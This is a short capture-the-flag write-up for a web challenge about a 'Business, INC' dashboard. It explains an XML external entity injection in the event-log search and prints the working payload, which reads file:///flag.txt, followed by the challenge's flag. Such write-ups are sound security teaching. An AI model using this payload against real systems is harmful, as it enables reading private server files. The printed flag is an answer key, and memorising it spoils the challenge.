### Problem
```text
Business, INC, the world's premier widget manufacturer, just released their fancy new dashboard, using all the hottest new web technologies from 2010.

This account doesn't seem to have a ton of access. Sucks.

Can you access the flag at /flag.txt?
```

### Solution
* XML injection in search bar on event logs
![image](https://user-images.githubusercontent.com/60841283/144747008-df23189a-9593-4090-9f4e-a2af64bfa09e.png)

* Normal Search
![image](https://user-images.githubusercontent.com/60841283/144746934-54da2661-328b-4599-b7ad-6ccf4a69336e.png)

* With Payload
![image](https://user-images.githubusercontent.com/60841283/144746975-c2e571ca-0ab2-41c9-8f92-a84989c8d2bf.png)


Payload :-
```html
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag.txt"> ]>
<params>
  <query>
    &ent;
  </query>
</params>
```
# Flag :- MetaCTF{el3m3nt4l_3xtern4lit1e5}
